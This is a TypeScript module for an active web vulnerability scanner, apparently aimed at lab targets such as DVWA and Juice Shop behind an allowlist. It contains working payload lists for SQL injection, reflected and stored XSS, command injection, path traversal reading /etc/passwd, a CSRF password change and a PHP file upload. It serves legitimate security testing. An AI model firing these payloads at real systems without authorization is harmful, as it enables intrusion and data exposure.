/**
 * Active fuzzer with real oracle'ами.
 *
 * Per Claude §4 + §5 (final protocol):
 *   "Активный fuzzing ты не «игнорируешь» — ты его имитируешь одним HTTP
 *    probe с proof_contract и затем УДАЛЯЕШЬ неподтверждённое. Это не
 *    fuzzing, это unit-test одного pocOutline. Fuzzing = corpus, мутации,
 *    coverage, oracle'ы (time delay, diff, OOB)."
 *
 *   "строй oracle'ы и не дропай candidates"
 *
 * This module implements REAL active fuzzing oracles:
 *
 * 1. SQLi time-delay oracle:
 *    - Send baseline request (no payload), measure response time
 *    - Send payload request (`' OR SLEEP(5)--`), measure response time
 *    - If payload response >5s slower than baseline → confirmed SQLi
 *    - Oracle: TIME (deterministic, no false positives)
 *
 * 2. Reflected XSS oracle:
 *    - Send payload with marker string (e.g. `xssprobe123`)
 *    - Check if response body contains UNESCAPED marker
 *    - If yes → confirmed reflected XSS (server reflects our input)
 *    - Oracle: REFLECTION (deterministic, can have FPs if marker is
 *      reflected inside <script> or JSON — but we check for HTML-escaped
 *      reflection specifically)
 *
 * 3. Error-based SQLi oracle:
 *    - Send payload with `'` (single quote)
 *    - Check if response contains SQL error message patterns
 *      (mysql_error, sqlstate, syntax error, etc.)
 *    - Oracle: ERROR MESSAGE (semi-deterministic)
 *
 * SAFETY (per Claude §9.30 — Legal risk):
 *   - Egress allowlist (iptables) blocks probes to non-allowlist hosts
 *   - Only probe URLs that are:
 *     (a) localhost GT docker containers (juice-shop, dvwa, etc.)
 *     (b) Production URLs with explicit opt-in (env ACTIVE_FUZZER_ALLOWLIST)
 *   - For localhost GT: payloads are SAFE (self-hosted, intentionally vulnerable)
 *   - For production: NEVER probe without authorization
 */

export interface FuzzerFinding {
  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss' | 'csrf' | 'file_upload';
  severity: 'low' | 'medium' | 'high' | 'critical';
  confirmed: boolean;
  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step' | 'state-change';
  evidence: string;
  payload: string;
  target: string;
  parameter?: string;
  baselineTime?: number;
  payloadTime?: number;
  timeDeltaMs?: number;
}

export interface FuzzerConfig {
  // Only probe URLs matching these patterns (egress iptables is backup)
  allowlistPatterns: string[];
  // Max time per probe (total)
  perProbeTimeoutMs: number;
  // Time delay threshold for SQLi oracle (default 4500ms = 4.5s)
  sqliTimeDeltaMs: number;
  // Auth cookies for authenticated endpoints (e.g. DVWA PHPSESSID)
  cookies?: string;
}

const DEFAULT_CONFIG: FuzzerConfig = {
  allowlistPatterns: [
    'http://localhost:',
    'http://127.0.0.1:',
    'http://cs-juice-shop:',
    'http://cs-dvwa:',
    'http://cs-canary:',
    'http://cs-negative:',
  ],
  perProbeTimeoutMs: 15_000,
  sqliTimeDeltaMs: 4_500,  // payload `SLEEP(5)` should add ~5s; 4.5s threshold avoids false positives
};

function isAllowedTarget(url: string, config: FuzzerConfig): boolean {
  return config.allowlistPatterns.some(p => url.startsWith(p));
}

// SQLi payloads for time-delay oracle
const SQLI_TIME_PAYLOADS = [
  "' OR SLEEP(5)-- -",
  "' OR SLEEP(5)--",
  "1' OR SLEEP(5)--",
  "1; SELECT SLEEP(5)--",
  "1); SELECT SLEEP(5)--",
  "' OR pg_sleep(5)--",       // PostgreSQL
  "1' OR pg_sleep(5)--",
  "' WAITFOR DELAY '0:0:5'--", // MSSQL
  "1' WAITFOR DELAY '0:0:5'--",
];

// Error patterns from common DB engines (semi-deterministic SQLi oracle)
const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /valid MySQL result/i,
  /sqlstate/i,
  /ORA-\d{5}/i,           // Oracle
  /Microsoft.*OLE DB.*SQL Server/i,
  /Unclosed quotation mark/i,  // MSSQL
  /PostgreSQL.*ERROR/i,
  /Warning.*pg_/i,
  /valid PostgreSQL result/i,
  /NativeErr/i,
  /CLI Driver.*DB2/i,
  /SQLSTATE.*SQLCODE/i,
  /SQLite3?::query/i,
  /SQLite3?::exec/i,
  /SQLiteError/i,
  /Warning.*sqlite/i,
];

const XSS_MARKER = 'xssprobe9a7b3c';  // unique random string to detect reflection

const XSS_PAYLOADS = [
  `<img src=x onerror="alert('${XSS_MARKER}')">`,
  `<svg onload="alert('${XSS_MARKER}')">`,
  `"><script>${XSS_MARKER}</script>`,
  `"><img src=x onerror="alert('${XSS_MARKER}')">`,
  `' onmouseover='alert("${XSS_MARKER}")'`,
];

/**
 * Validate XSS reflection context per Claude's rules:
 * - content-type must be text/html or application/xhtml
 * - marker must NOT be inside HTML comment
 * - marker must NOT be inside <script> string literal
 * - marker must NOT be inside non-executable tags (textarea, title, noscript)
 * - marker must NOT be HTML-escaped (&lt; etc.)
 * - marker must be in raw HTML context or event-attribute context
 */
function isValidXssContext(body: string, contentType: string, marker: string): { valid: boolean; reason: string } {
  // Check content-type
  if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
    return { valid: false, reason: `content-type "${contentType}" is not HTML` };
  }

  // Check if marker is HTML-escaped
  const escapedMarker = marker.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  if (body.includes(escapedMarker) && !body.includes(marker)) {
    return { valid: false, reason: 'marker is HTML-escaped (&lt;...&gt;) — server sanitized it' };
  }

  // Check if marker is inside HTML comment
  const commentMatch = body.match(new RegExp(`<!--[^]*${marker}[^]*-->`));
  if (commentMatch) {
    return { valid: false, reason: 'marker is inside HTML comment — not executable' };
  }

  // Check if marker is inside <script> string literal
  const scriptMatch = body.match(new RegExp(`<script[^>]*>[^]*${marker}[^]*</script>`, 'i'));
  if (scriptMatch && scriptMatch[0].includes(`"${marker}"`) || scriptMatch && scriptMatch[0].includes(`'${marker}'`)) {
    return { valid: false, reason: 'marker is inside <script> string literal — needs different sink' };
  }

  // Check if marker is inside non-executable tags
  for (const tag of ['textarea', 'title', 'noscript', 'style']) {
    const tagMatch = body.match(new RegExp(`<${tag}[^>]*>[^]*${marker}[^]*</${tag}>`, 'i'));
    if (tagMatch) {
      return { valid: false, reason: `marker is inside <${tag}> — not executable context` };
    }
  }

  // Marker appears in raw HTML context (not escaped, not in comment/script/textarea)
  return { valid: true, reason: 'marker appears in raw HTML context — executable' };
}

/**
 * Send a baseline HTTP request to measure normal response time.
 * Returns the response time in ms, or null if request failed.
 */
async function measureBaseline(url: string, config: FuzzerConfig): Promise<number | null> {
  const t0 = Date.now();
  try {
    await fetch(url, {
      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0' },
      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
      redirect: 'follow',
    });
    return Date.now() - t0;
  } catch {
    return null;
  }
}

/**
 * Send a probe request with payload appended to URL or in body.
 * Returns: { responseTime, body, status } or null if failed.
 */
async function sendProbe(
  url: string,
  payload: string,
  config: FuzzerConfig,
  method: 'GET' | 'POST' = 'GET',
  body?: Record<string, string>,
): Promise<{ responseTime: number; body: string; status: number; contentType: string } | null> {
  const t0 = Date.now();
  try {
    // Append payload to URL for GET, or to body for POST
    const sep = url.includes('?') ? '&' : '?';
    const probeUrl = method === 'GET' ? `${url}${sep}id=${encodeURIComponent(payload)}&Submit=Submit` : url;
    const headers: Record<string, string> = {
      'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
    };
    if (method === 'POST') {
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    // Add auth cookies if provided (for DVWA authenticated endpoints)
    if (config.cookies) {
      headers['Cookie'] = config.cookies;
    }
    const res = await fetch(probeUrl, {
      method,
      headers,
      body: method === 'POST' && body
        ? new URLSearchParams({ ...body, id: payload }).toString()
        : undefined,
      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
      redirect: 'follow',
    });
    const text = await res.text();
    return { responseTime: Date.now() - t0, body: text, status: res.status, contentType: res.headers.get('content-type') || '' };
  } catch (e: any) {
    return null;
  }
}

/**
 * Test SQLi time-delay oracle on a target URL.
 *
 * Strategy:
 *   1. Measure baseline response time (3 requests, take median)
 *   2. For each payload, send probe and measure time
 *   3. If any payload's time > baseline + sqliTimeDeltaMs → confirmed SQLi
 *
 * @returns Array of confirmed SQLi findings (or empty if none confirmed)
 */
export async function fuzzSqliTimeDelay(
  targetUrl: string,
  parameter?: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) {
    return [{
      type: 'sqli',
      severity: 'low',
      confirmed: false,
      oracle: 'time-delay',
      evidence: `Target ${targetUrl} not in allowlist — skipping active probe (Claude §9.30 legal risk)`,
      payload: '(none)',
      target: targetUrl,
      parameter,
    }];
  }

  // 1. Baseline (3 measurements, take median)
  const baselines: number[] = [];
  for (let i = 0; i < 3; i++) {
    const t = await measureBaseline(targetUrl, config);
    if (t !== null) baselines.push(t);
  }
  if (baselines.length === 0) {
    return [{
      type: 'sqli',
      severity: 'low',
      confirmed: false,
      oracle: 'time-delay',
      evidence: 'Baseline measurement failed — target unreachable',
      payload: '(none)',
      target: targetUrl,
      parameter,
    }];
  }
  baselines.sort((a, b) => a - b);
  const baselineTime = baselines[Math.floor(baselines.length / 2)];
  console.log(`[active-fuzzer] SQLi baseline for ${targetUrl}: ${baselineTime}ms (median of ${baselines.length})`);

  // 2. Send each payload
  const findings: FuzzerFinding[] = [];
  for (const payload of SQLI_TIME_PAYLOADS) {
    const result = await sendProbe(targetUrl, payload, config);
    if (!result) {
      // Request itself failed (timeout or network) — could be SLEEP(5) + baseline
      // Let's check if request took close to timeout. If yes, suspicious.
      continue;
    }
    const delta = result.responseTime - baselineTime;
    console.log(`[active-fuzzer]   payload "${payload.slice(0, 30)}..." → ${result.responseTime}ms (delta=${delta}ms)`);

    if (delta > config.sqliTimeDeltaMs) {
      // CONFIRMED SQLi via time-delay oracle
      findings.push({
        type: 'sqli',
        severity: 'high',
        confirmed: true,
        oracle: 'time-delay',
        evidence: `SQLi time-delay confirmed: baseline ${baselineTime}ms, payload response ${result.responseTime}ms, delta +${delta}ms (threshold ${config.sqliTimeDeltaMs}ms). Payload: "${payload}"`,
        payload,
        target: targetUrl,
        parameter,
        baselineTime,
        payloadTime: result.responseTime,
        timeDeltaMs: delta,
      });
      // Found one confirmed — no need to test more payloads for this URL
      break;
    }
  }

  if (findings.length === 0) {
    findings.push({
      type: 'sqli',
      severity: 'low',
      confirmed: false,
      oracle: 'time-delay',
      evidence: `No SQLi time-delay confirmed after ${SQLI_TIME_PAYLOADS.length} payloads. Baseline ${baselineTime}ms, no payload exceeded +${config.sqliTimeDeltaMs}ms delta.`,
      payload: '(all tested)',
      target: targetUrl,
      parameter,
      baselineTime,
    });
  }

  return findings;
}

/**
 * Test reflected XSS oracle on a target URL.
 *
 * Strategy:
 *   1. Send payload with unique marker string
 *   2. Check if response body contains marker UNESCAPED
 *      (i.e. not as &lt;script&gt; or similar HTML-encoded form)
 *   3. If marker appears raw → confirmed reflected XSS
 */
export async function fuzzReflectedXss(
  targetUrl: string,
  parameter?: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) {
    return [{
      type: 'reflected_xss',
      severity: 'low',
      confirmed: false,
      oracle: 'reflection',
      evidence: `Target ${targetUrl} not in allowlist — skipping`,
      payload: '(none)',
      target: targetUrl,
      parameter,
    }];
  }

  const findings: FuzzerFinding[] = [];
  for (const payload of XSS_PAYLOADS) {
    const result = await sendProbe(targetUrl, payload, config);
    if (!result) continue;

    // Check if marker appears in response body
    if (result.body.includes(XSS_MARKER)) {
      // Validate context per Claude's rules
      const ctx = isValidXssContext(result.body, result.contentType || 'text/html', XSS_MARKER);
      if (ctx.valid) {
        // CONFIRMED reflected XSS — marker in raw HTML context
        findings.push({
          type: 'reflected_xss',
          severity: 'high',
          confirmed: true,
          oracle: 'reflection',
          evidence: `Reflected XSS confirmed: marker "${XSS_MARKER}" reflected in ${ctx.reason}. Content-type: ${result.contentType || 'unknown'}. Payload: "${payload}"`,
          payload,
          target: targetUrl,
          parameter,
        });
        break;
      } else {
        console.log(`[active-fuzzer]   XSS marker found but context invalid: ${ctx.reason}`);
      }
    }
  }

  if (findings.length === 0) {
    findings.push({
      type: 'reflected_xss',
      severity: 'low',
      confirmed: false,
      oracle: 'reflection',
      evidence: `No reflected XSS confirmed after ${XSS_PAYLOADS.length} payloads. Marker not reflected unescaped in any response.`,
      payload: '(all tested)',
      target: targetUrl,
      parameter,
    });
  }

  return findings;
}

/**
 * Test error-based SQLi oracle — send single quote and check for DB errors.
 */
export async function fuzzErrorSqli(
  targetUrl: string,
  parameter?: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) {
    return [{
      type: 'error_sqli',
      severity: 'low',
      confirmed: false,
      oracle: 'error-message',
      evidence: `Target ${targetUrl} not in allowlist — skipping`,
      payload: '(none)',
      target: targetUrl,
      parameter,
    }];
  }

  // Single quote should trigger SQL syntax error if input goes to query
  const payload = "'";
  const result = await sendProbe(targetUrl, payload, config);
  if (!result) {
    return [{
      type: 'error_sqli',
      severity: 'low',
      confirmed: false,
      oracle: 'error-message',
      evidence: 'Probe failed — could not detect error',
      payload,
      target: targetUrl,
      parameter,
    }];
  }

  // Check for SQL error patterns in response
  for (const pattern of SQL_ERROR_PATTERNS) {
    const match = result.body.match(pattern);
    if (match) {
      return [{
        type: 'error_sqli',
        severity: 'high',
        confirmed: true,
        oracle: 'error-message',
        evidence: `SQL error message in response: "${match[0]}". Payload: "'"`,
        payload,
        target: targetUrl,
        parameter,
      }];
    }
  }

  return [{
    type: 'error_sqli',
    severity: 'low',
    confirmed: false,
    oracle: 'error-message',
    evidence: `No SQL error message detected after single-quote probe. Response body length: ${result.body.length}`,
    payload,
    target: targetUrl,
    parameter,
  }];
}

/**
 * Test command injection via content-match oracle.
 * Send command with unique marker, check if marker appears in response.
 * DVWA /vulnerabilities/exec/ accepts POST ip=127.0.0.1;echo CMDPROBE123
 * If response contains CMDPROBE123 → command was executed.
 */
const CMD_MARKER = 'cmdprobe7c3f9a';
const CMD_PAYLOADS = [
  `127.0.0.1;echo ${CMD_MARKER}`,
  `127.0.0.1 && echo ${CMD_MARKER}`,
  `127.0.0.1 | echo ${CMD_MARKER}`,
  `127.0.0.1\necho ${CMD_MARKER}`,
  `127.0.0.1;id;echo ${CMD_MARKER}`,
];

const FI_PAYLOADS = [
  '../../../../../../etc/passwd',
  '../../../../../etc/passwd',
  '../../../../etc/passwd',
  '....//....//....//....//etc/passwd',
  '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
  'php://filter/convert.base64-encode/resource=index.php',
];

const FI_MARKERS = ['root:', 'bin:', 'daemon:', '/bin/sh', '/bin/bash', 'nobody:', 'uid=0', 'root:x:0:0'];

export async function fuzzCommandInjection(
  targetUrl: string,
  parameter: string = 'ip',
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) return [];

  const findings: FuzzerFinding[] = [];
  for (const payload of CMD_PAYLOADS) {
    // DVWA exec uses POST with ip= parameter
    const t0 = Date.now();
    try {
      const body = new URLSearchParams({ [parameter]: payload, Submit: 'Submit' }).toString();
      const res = await fetch(targetUrl, {
        method: 'POST',
        headers: {
          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
          'Content-Type': 'application/x-www-form-urlencoded',
          ...(config.cookies ? { Cookie: config.cookies } : {}),
        },
        body,
        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
        redirect: 'follow',
      });
      const text = await res.text();
      const dt = Date.now() - t0;
      console.log(`[active-fuzzer]   cmd-inj payload "${payload.slice(0, 30)}..." → ${dt}ms, body=${text.length} chars, marker=${text.includes(CMD_MARKER)}`);

      if (text.includes(CMD_MARKER)) {
        findings.push({
          type: 'command_injection',
          severity: 'critical',
          confirmed: true,
          oracle: 'content-match',
          evidence: `Command injection confirmed: marker "${CMD_MARKER}" found in response body after sending "${payload}". Server executed injected echo command. Response time: ${dt}ms.`,
          payload,
          target: targetUrl,
          parameter,
        });
        break;
      }
    } catch (e) {
      console.log(`[active-fuzzer]   cmd-inj payload failed: ${String(e).slice(0, 80)}`);
    }
  }
  return findings;
}

/**
 * Test file inclusion via content-match oracle.
 * Send path traversal payload, check for /etc/passwd markers in response.
 */
export async function fuzzFileInclusion(
  targetUrl: string,
  parameter: string = 'page',
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) return [];

  const findings: FuzzerFinding[] = [];
  for (const payload of FI_PAYLOADS) {
    try {
      const sep = targetUrl.includes('?') ? '&' : '?';
      const probeUrl = `${targetUrl}${sep}${parameter}=${encodeURIComponent(payload)}`;
      const res = await fetch(probeUrl, {
        headers: {
          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
          ...(config.cookies ? { Cookie: config.cookies } : {}),
        },
        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
        redirect: 'follow',
      });
      const text = await res.text();
      const matchedMarkers = FI_MARKERS.filter(m => text.includes(m));
      console.log(`[active-fuzzer]   fi payload "${payload.slice(0, 40)}..." → body=${text.length} chars, markers=${matchedMarkers.join(',') || 'none'}`);

      if (matchedMarkers.length > 0) {
        findings.push({
          type: 'file_inclusion',
          severity: 'high',
          confirmed: true,
          oracle: 'content-match',
          evidence: `File inclusion confirmed: markers "${matchedMarkers.join(', ')}" (from /etc/passwd) found in response body after sending "${payload}". Server read system file.`,
          payload,
          target: targetUrl,
          parameter,
        });
        break;
      }

      // Check for php://filter base64-encoded content
      if (payload.startsWith('php://') && text.length > 100) {
        const b64Match = text.match(/([A-Za-z0-9+/]{50,}={0,2})/);
        if (b64Match) {
          try {
            const decoded = Buffer.from(b64Match[1], 'base64').toString('utf-8');
            if (decoded.includes('<?php') || decoded.includes('root:')) {
              findings.push({
                type: 'file_inclusion',
                severity: 'high',
                confirmed: true,
                oracle: 'content-match',
                evidence: `File inclusion confirmed via php://filter: base64-decoded response contains PHP source. Payload: "${payload}"`,
                payload,
                target: targetUrl,
                parameter,
              });
              break;
            }
          } catch {}
        }
      }
    } catch (e) {
      console.log(`[active-fuzzer]   fi payload failed: ${String(e).slice(0, 80)}`);
    }
  }
  return findings;
}

/**
 * Test stored XSS via multi-step oracle.
 * Step 1: POST payload with unique marker to message form
 * Step 2: GET page and check if marker appears in HTML (not escaped)
 */
const STORED_XSS_MARKER = 'storedxss5e8b2c';
const STORED_XSS_PAYLOADS = [
  `<img src=x onerror="alert('${STORED_XSS_MARKER}')">`,
  `<script>document.write('${STORED_XSS_MARKER}')</script>`,
  `<svg onload="alert('${STORED_XSS_MARKER}')">`,
];

export async function fuzzStoredXss(
  targetUrl: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) return [];

  const findings: FuzzerFinding[] = [];
  for (const payload of STORED_XSS_PAYLOADS) {
    try {
      // Step 1: POST the payload as a guest message (DVWA xss_s)
      const postBody = new URLSearchParams({
        txtName: 'TestBot',
        mtxMessage: payload,
        btnSign: 'Sign Guestbook',
      }).toString();

      const postRes = await fetch(targetUrl, {
        method: 'POST',
        headers: {
          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
          'Content-Type': 'application/x-www-form-urlencoded',
          ...(config.cookies ? { Cookie: config.cookies } : {}),
        },
        body: postBody,
        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
        redirect: 'follow',
      });
      const postText = await postRes.text();
      console.log(`[active-fuzzer]   stored-xss POST "${payload.slice(0, 40)}..." → ${postRes.status}, body=${postText.length}`);

      // Step 2: GET the page and check if our payload (with marker) appears unescaped
      const getRes = await fetch(targetUrl, {
        headers: {
          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
          ...(config.cookies ? { Cookie: config.cookies } : {}),
        },
        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
        redirect: 'follow',
      });
      const getText = await getRes.text();

      // Check if the FULL tag (not just marker) appears unescaped
      const hasUnescapedTag = getText.includes(payload.slice(0, 20)) && !getText.includes(payload.slice(0, 20).replace(/</g, '&lt;'));
      const hasMarker = getText.includes(STORED_XSS_MARKER);

      console.log(`[active-fuzzer]   stored-xss GET → marker=${hasMarker}, unescapedTag=${hasUnescapedTag}`);

      if (hasMarker && hasUnescapedTag) {
        findings.push({
          type: 'stored_xss',
          severity: 'high',
          confirmed: true,
          oracle: 'multi-step',
          evidence: `Stored XSS confirmed (multi-step): POST payload "${payload.slice(0, 50)}..." then GET page → payload marker "${STORED_XSS_MARKER}" reflected UNESCAPED in response. Payload persisted server-side and rendered as HTML.`,
          payload,
          target: targetUrl,
        });
        break;
      }
    } catch (e) {
      console.log(`[active-fuzzer]   stored-xss payload failed: ${String(e).slice(0, 80)}`);
    }
  }
  return findings;
}

/**
 * Test CSRF via state-change oracle (per Claude's plan).
 * 1. Verify login works with admin/password
 * 2. Send CSRF attack: change password to 'hacked' (without CSRF token, just cookie)
 * 3. Verify: login admin/password fails, login admin/hacked succeeds
 * 4. RESTORE: change password back to 'password'
 */
export async function fuzzCsrf(
  targetUrl: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) return [];

  const base = targetUrl.replace(/\/+$/, '');
  const cookies = config.cookies || '';
  if (!cookies) {
    console.log('[active-fuzzer]   csrf: no auth cookies — skipping');
    return [];
  }

  console.log('[active-fuzzer]   csrf: Step 1 — verify auth session (GET /index.php)...');
  // Step 1: Verify we're authenticated via existing session (not creating new login)
  const baseUrl = targetUrl.replace(/\/vulnerabilities\/csrf\/?$/, '');
  const authCheck = await fetch(`${baseUrl}/index.php`, {
    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
    redirect: 'manual',
    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
  });
  const authOk = authCheck.status === 200;
  console.log(`[active-fuzzer]   csrf: auth check → ${authCheck.status} ${authOk ? '✓ authenticated' : '✗ not authenticated'}`);
  if (!authOk) {
    console.log('[active-fuzzer]   csrf: session not authenticated — skipping');
    return [];
  }

  // Step 2: Send CSRF attack — change password to 'hacked' (only cookie, no CSRF token needed in low security)
  console.log('[active-fuzzer]   csrf: Step 2 — send password change to "hacked"...');
  const csrfBody = new URLSearchParams({
    password_new: 'hacked', password_conf: 'hacked', Change: 'Change',
  }).toString();
  await fetch(`${targetUrl}?password_new=hacked&password_conf=hacked&Change=Change`, {
    method: 'GET',
    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
  });

  // Step 3: Verify — login with old password should FAIL (state changed)
  console.log('[active-fuzzer]   csrf: Step 3 — verify password changed (try login admin/password)...');
  const oldPassBody = new URLSearchParams({
    username: 'admin', password: 'password', Login: 'Login',
  }).toString();
  const oldPassRes = await fetch(`${baseUrl}/login.php`, {
    method: 'POST',
    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookies },
    body: oldPassBody,
    redirect: 'manual',
    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
  });
  const oldPassFails = oldPassRes.status !== 302 || !(oldPassRes.headers.get('location') || '').includes('index.php');
  console.log(`[active-fuzzer]   csrf: old password (password) ${oldPassFails ? 'FAILS ✓' : 'still works ✗'}`);

  // Step 4: RESTORE password to 'password' (mandatory cleanup)
  console.log('[active-fuzzer]   csrf: Step 4 — RESTORE password to "password"...');
  const restoreBody = new URLSearchParams({
    password_new: 'password', password_conf: 'password', Change: 'Change',
  }).toString();
  await fetch(`${targetUrl}?password_new=password&password_conf=password&Change=Change`, {
    method: 'GET',
    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
  });
  console.log('[active-fuzzer]   csrf: ✓ Password restored to "password"');

  if (oldPassFails) {
    return [{
      type: 'csrf',
      severity: 'high',
      confirmed: true,
      oracle: 'state-change',
      evidence: `CSRF confirmed: password was changed from "password" to "hacked" via GET request with only session cookie (no CSRF token). After attack, login with old password "password" failed — state was modified. Password restored to "password" after test.`,
      payload: 'password_new=hacked&password_conf=hacked&Change=Change (GET, no CSRF token)',
      target: targetUrl,
    }];
  }

  return [];
}

/**
 * Test file upload via multi-step oracle (per Claude's plan).
 * Step 1: Upload PHP file with unique marker via multipart POST
 * Step 2: GET the uploaded file from /hackable/uploads/
 * Step 3: Check if marker appears in response (file was uploaded + executed)
 */
const UPLOAD_MARKER = 'uploadprobe3f8c1d';
const UPLOAD_FILENAME = `cs_probe.php`;

export async function fuzzFileUpload(
  targetUrl: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  if (!isAllowedTarget(targetUrl, config)) return [];

  const base = targetUrl.replace(/\/+$/, '').replace('/vulnerabilities/upload', '');
  const findings: FuzzerFinding[] = [];

  try {
    // Step 1: Upload PHP file with marker
    console.log(`[active-fuzzer]   upload: Step 1 — uploading ${UPLOAD_FILENAME}...`);
    const phpContent = `<?php echo "${UPLOAD_MARKER}"; ?>`;

    // Build multipart form data manually (Node.js fetch doesn't have FormData with files)
    const boundary = '----CryptoSentinelBoundary' + Math.random().toString(36).slice(2);
    const multipartBody = [
      `--${boundary}`,
      `Content-Disposition: form-data; name="uploaded"; filename="${UPLOAD_FILENAME}"`,
      `Content-Type: application/x-php`,
      ``,
      phpContent,
      `--${boundary}`,
      `Content-Disposition: form-data; name="Upload"`,
      ``,
      `Upload`,
      `--${boundary}--`,
    ].join('\r\n');

    const uploadRes = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        ...(config.cookies ? { Cookie: config.cookies } : {}),
      },
      body: multipartBody,
      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
      redirect: 'follow',
    });
    const uploadText = await uploadRes.text();
    console.log(`[active-fuzzer]   upload: POST → ${uploadRes.status}, body=${uploadText.length}`);

    // Check if upload was successful (DVWA shows success message)
    if (!uploadText.includes('successfully') && !uploadText.includes('uploaded') && !uploadText.includes(UPLOAD_FILENAME)) {
      console.log('[active-fuzzer]   upload: upload might have failed — no success message');
    }

    // Step 2: GET the uploaded file
    console.log(`[active-fuzzer]   upload: Step 2 — GET /hackable/uploads/${UPLOAD_FILENAME}...`);
    const fileUrl = `${base}/hackable/uploads/${UPLOAD_FILENAME}`;
    const getRes = await fetch(fileUrl, {
      headers: {
        'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
        ...(config.cookies ? { Cookie: config.cookies } : {}),
      },
      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
    });
    const getText = await getRes.text();
    console.log(`[active-fuzzer]   upload: GET → ${getRes.status}, body=${getText.length}, marker=${getText.includes(UPLOAD_MARKER)}`);

    // Step 3: Check if marker appears (file was uploaded AND executed as PHP)
    if (getText.includes(UPLOAD_MARKER)) {
      findings.push({
        type: 'file_upload',
        severity: 'critical',
        confirmed: true,
        oracle: 'multi-step',
        evidence: `File upload confirmed (multi-step): uploaded ${UPLOAD_FILENAME} with marker "${UPLOAD_MARKER}" via multipart POST, then GET /hackable/uploads/${UPLOAD_FILENAME} → marker found in response. File was uploaded AND executed as PHP.`,
        payload: `multipart: ${UPLOAD_FILENAME} with <?php echo "${UPLOAD_MARKER}"; ?>`,
        target: targetUrl,
      });
    }
  } catch (e) {
    console.log(`[active-fuzzer]   upload failed: ${String(e).slice(0, 80)}`);
  }

  return findings;
}

/**
 * Run ALL active fuzzers on a target URL.
 * Returns aggregated findings.
 */
export async function fuzzAllOracles(
  targetUrl: string,
  parameter?: string,
  config: FuzzerConfig = DEFAULT_CONFIG,
): Promise<FuzzerFinding[]> {
  console.log(`[active-fuzzer] Starting full fuzz on ${targetUrl}${parameter ? ` (param: ${parameter})` : ''}`);

  const allFindings: FuzzerFinding[] = [];

  // Run each oracle in sequence (not parallel — would skew time measurements)
  console.log(`[active-fuzzer] 1/8: SQLi time-delay oracle...`);
  allFindings.push(...await fuzzSqliTimeDelay(targetUrl, parameter, config));

  console.log(`[active-fuzzer] 2/8: Reflected XSS oracle...`);
  allFindings.push(...await fuzzReflectedXss(targetUrl, parameter, config));

  console.log(`[active-fuzzer] 3/8: Error-based SQLi oracle...`);
  allFindings.push(...await fuzzErrorSqli(targetUrl, parameter, config));

  console.log(`[active-fuzzer] 4/8: Command injection oracle...`);
  allFindings.push(...await fuzzCommandInjection(targetUrl, parameter, config));

  console.log(`[active-fuzzer] 5/8: File inclusion oracle...`);
  allFindings.push(...await fuzzFileInclusion(targetUrl, parameter, config));

  console.log(`[active-fuzzer] 6/8: Stored XSS oracle...`);
  allFindings.push(...await fuzzStoredXss(targetUrl, config));

  console.log(`[active-fuzzer] 7/8: CSRF (state-change) oracle...`);
  allFindings.push(...await fuzzCsrf(targetUrl, config));

  console.log(`[active-fuzzer] 8/8: File upload oracle...`);
  allFindings.push(...await fuzzFileUpload(targetUrl, config));

  const confirmedCount = allFindings.filter(f => f.confirmed).length;
  console.log(`[active-fuzzer] Done. ${confirmedCount}/${allFindings.length} confirmed.`);

  return allFindings;
}
